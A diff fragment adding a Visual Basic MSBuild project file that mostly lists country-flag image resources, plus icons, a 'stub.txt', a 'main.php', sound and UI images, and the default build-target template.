+    <None Include="Resources\km.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kp.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ky.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\la.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lb.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\li.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ls.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ly.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ma.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\main.php" />
+    <None Include="Resources\mc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\md.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\me.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ml.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mp.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mq.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ms.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mx.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\my.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\na.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ne.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ng.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ni.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\no.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\np.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\om.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pa.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pe.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ph.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ps.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\pw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\py.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\qa.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\re.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ro.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\rs.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ru.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\rw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sa.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sb.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\scotland.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\se.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\si.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sj.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\so.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\st.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sy.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\td.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\th.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tj.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\to.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ua.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ug.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\um.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\us.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\uy.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\uz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\va.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\vc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ve.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\vg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\vi.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\vn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\vu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\wales.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\wf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ws.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ye.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\yt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\za.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\zm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\zw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="CPQLDKm.ico" />
+    <Content Include="icon.ico" />
+    <None Include="Resources\stub.txt" />
+    <Content Include="Untitled.ico" />
+    <None Include="Resources\servers.png" />
+    <None Include="Resources\globe.png" />
+    <None Include="Resources\notify.wav" />
+    <None Include="Resources\information.png" />
+    <None Include="Resources\exclamation.png" />
+    <None Include="Resources\wait.gif" />
+    <None Include="Resources\up.png" />
+    <None Include="Resources\down.png" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
